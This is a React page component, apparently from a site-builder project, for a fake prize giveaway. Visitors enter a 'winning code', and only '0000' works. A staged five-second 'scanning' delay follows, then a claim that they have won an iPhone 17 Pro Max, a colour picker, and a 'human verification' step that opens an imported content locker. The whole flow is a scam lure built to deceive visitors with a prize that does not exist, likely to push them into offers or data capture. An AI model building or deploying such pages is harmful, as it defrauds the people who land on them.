"use client";

import React, { useState } from "react";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { MadeWithDyad } from "@/components/made-with-dyad";
import { Loader2 } from "lucide-react";
import Header from "@/components/Header";
import Locker from "./Locker";

// Define prize data
const prizeData: { [key: string]: { name: string; image: string } } = {
  "0000": { name: "iPhone 17 Pro Max", image: "/iphones.png" },
};

const Index: React.FC = () => {
  const [code, setCode] = useState<string>("");
  const [isSuccessModalOpen, setIsSuccessModalOpen] = useState<boolean>(false);
  const [isErrorModalOpen, setIsErrorModalOpen] = useState<boolean>(false);
  const [isLoading, setIsLoading] = useState<boolean>(false);
  const [isColorModalOpen, setIsColorModalOpen] = useState<boolean>(false);
  const [isAgreementModalOpen, setIsAgreementModalOpen] =
    useState<boolean>(false);
  const [winningPrize, setWinningPrize] = useState<{
    name: string;
    image: string;
  } | null>(null);

  const [showLocker, setShowLocker] = useState<boolean>(false);

  const colorOptions = [
    { name: "Blue", image: "/blue.png", colorClass: "bg-blue-900" },
    { name: "Orange", image: "/orange.png", colorClass: "bg-orange-500" },
    { name: "White", image: "/white.png", colorClass: "bg-slate-100" },
    { name: "Black", image: "/black.png", colorClass: "bg-black" },
  ];

  const [selectedColor, setSelectedColor] = useState(colorOptions[0]);

  const handleCheckCode = () => {
    setIsLoading(true);
    setIsSuccessModalOpen(false);
    setIsErrorModalOpen(false);
    setWinningPrize(null);

    setTimeout(() => {
      setIsLoading(false);
      const prize = prizeData[code];
      if (prize) {
        setWinningPrize(prize);
        setIsSuccessModalOpen(true);
      } else {
        setIsErrorModalOpen(true);
      }
    }, 5000);
  };

  const handleChooseColor = () => {
    setIsSuccessModalOpen(false);
    setIsColorModalOpen(true);
  };

  const handleAgreement = () => {
    setIsColorModalOpen(false);
    setIsAgreementModalOpen(true);
  };

  const handleStartVerification = () => {
    setIsAgreementModalOpen(false);
    setShowLocker(true);
  };

  const handleCloseLocker = () => {
    setShowLocker(false);
    setIsAgreementModalOpen(true); // Return to the agreement step
  };

  const handleKeyDown = (event: React.KeyboardEvent<HTMLInputElement>) => {
    if (event.key === "Enter" && !isLoading) {
      handleCheckCode();
    }
  };

  return (
    <div className="min-h-screen w-full font-poppins flex flex-col">
      <Header />
      <div className="flex flex-col items-center justify-center flex-grow w-full text-center animate-fade-in p-4 md:p-8 lg:p-12">
        <h1 className="text-4xl font-bold text-gray-800 mb-4">
          Enter Your Winning Code
        </h1>
        <p className="text-lg text-gray-600 mb-8">
          If you have won, you should have received a winning code.
        </p>
        <div className="flex flex-col sm:flex-row gap-4 mb-8 max-w-md w-full justify-center">
          <Input
            type="text"
            placeholder="Your Code"
            value={code}
            onChange={(e) => setCode(e.target.value)}
            onKeyDown={handleKeyDown}
            className="p-3 border border-gray-300 rounded-md focus:ring-2 focus:ring-blue-500 transition-all duration-200 hover:border-blue-400"
            disabled={isLoading}
          />
          <Button
            onClick={handleCheckCode}
            className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-md transition-all duration-300 ease-in-out transform hover:scale-105 relative overflow-hidden group"
            disabled={isLoading}
          >
            <span className="relative z-10">Check Code</span>
            <span className="absolute inset-0 bg-gradient-to-r from-blue-500 to-blue-700 opacity-0 group-hover:opacity-100 transition-opacity duration-300 blur-sm"></span>
          </Button>
        </div>
      </div>

      <Dialog open={isLoading} onOpenChange={setIsLoading}>
        <DialogContent className="sm:max-w-md bg-white p-6 rounded-3xl shadow-2xl text-center animate-scale-in border-none">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-blue-600 mb-2">
              <Loader2 className="h-8 w-8 animate-spin mx-auto mb-4" />
              Scanning Code...
            </DialogTitle>
            <DialogDescription className="text-gray-700 text-lg">
              Please wait while we verify your code.
            </DialogDescription>
          </DialogHeader>
        </DialogContent>
      </Dialog>

      <Dialog open={isSuccessModalOpen} onOpenChange={setIsSuccessModalOpen}>
        <DialogContent className="sm:max-w-md bg-white p-6 rounded-3xl shadow-2xl text-center animate-scale-in border-none">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-green-600 mb-2">
              Congratulations! 🎉
            </DialogTitle>
            {winningPrize && (
              <div className="mt-4 mb-6">
                <img
                  src={winningPrize.image}
                  alt={winningPrize.name}
                  className="mx-auto h-45 w-45 object-contain mb-4"
                />
                <p className="text-2xl font-semibold text-gray-800">
                  You have won an iPhone 17 Pro Max
                </p>
              </div>
            )}
            <DialogDescription className="text-gray-700 text-lg">
              Click below to choose a color.
            </DialogDescription>
          </DialogHeader>
          <Button
            onClick={handleChooseColor}
            className="w-full py-3 mt-6 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-xl transition-all duration-300 ease-in-out transform hover:scale-105"
          >
            Choose Color
          </Button>
        </DialogContent>
      </Dialog>

      <Dialog open={isColorModalOpen} onOpenChange={setIsColorModalOpen}>
        <DialogContent className="sm:max-w-sm bg-white p-6 rounded-3xl shadow-2xl text-center animate-scale-in border-none">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-gray-800 mb-2">
              Choose Your Color
            </DialogTitle>
            <DialogDescription className="text-gray-600">
              Select your preferred color for your iPhone 17 Pro Max.
            </DialogDescription>
          </DialogHeader>
          <div className="flex justify-center my-6">
            <img
              src={selectedColor.image}
              alt={selectedColor.name}
              className="h-64 object-contain transition-all duration-300"
            />
          </div>
          <div className="flex justify-center items-center gap-4 mb-6">
            {colorOptions.map((color) => (
              <button
                key={color.name}
                onClick={() => setSelectedColor(color)}
                className={`w-8 h-8 rounded-full ${color.colorClass} border-2 border-white transition-all duration-200 ${
                  selectedColor.name === color.name
                    ? "ring-2 ring-offset-2 ring-blue-500"
                    : ""
                }`}
                aria-label={`Choose ${color.name}`}
              />
            ))}
          </div>
          <Button
            onClick={handleAgreement}
            className="w-full py-3 mt-4 bg-blue-600 hover:bg-blue-700 text-white font-semibold rounded-xl transition-all duration-300 ease-in-out transform hover:scale-105"
          >
            Continue
          </Button>
        </DialogContent>
      </Dialog>

      <Dialog
        open={isAgreementModalOpen}
        onOpenChange={setIsAgreementModalOpen}
      >
        <DialogContent className="sm:max-w-md bg-white p-6 rounded-3xl shadow-2xl text-center animate-scale-in border-none">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-gray-800 mb-4">
              Verification
            </DialogTitle>
            <DialogDescription className="text-gray-600 text-left">
              Before we can provide you with the receipt to pick up your iPhone
              at a nearby store, you must pass the human verification test.
            </DialogDescription>
          </DialogHeader>

          <div className="flex flex-col gap-4 mt-6">
            <button
              onClick={handleStartVerification}
              className="w-full py-3 bg-green-600 hover:bg-green-700 text-white font-semibold rounded-xl transition-all duration-300 ease-in-out transform hover:scale-105"
            >
              I agree to verify
            </button>
          </div>
        </DialogContent>
      </Dialog>

      <Dialog open={isErrorModalOpen} onOpenChange={setIsErrorModalOpen}>
        <DialogContent className="sm:max-w-md bg-white p-6 rounded-3xl shadow-2xl text-center animate-scale-in border-none">
          <DialogHeader>
            <DialogTitle className="text-3xl font-bold text-red-600 mb-2">
              ❌ Invalid Code
            </DialogTitle>
            <DialogDescription className="text-gray-700 text-lg">
              The code entered is incorrect. Please try again.
            </DialogDescription>
          </DialogHeader>
          <Button
            onClick={() => setIsErrorModalOpen(false)}
            className="w-full py-3 mt-6 bg-gray-300 hover:bg-gray-400 text-gray-800 font-semibold rounded-xl transition-all duration-300 ease-in-out transform hover:scale-105"
          >
            Close
          </Button>
        </DialogContent>
      </Dialog>

      {showLocker && <Locker onClose={handleCloseLocker} />}

      <MadeWithDyad />
    </div>
  );
};

export default Index;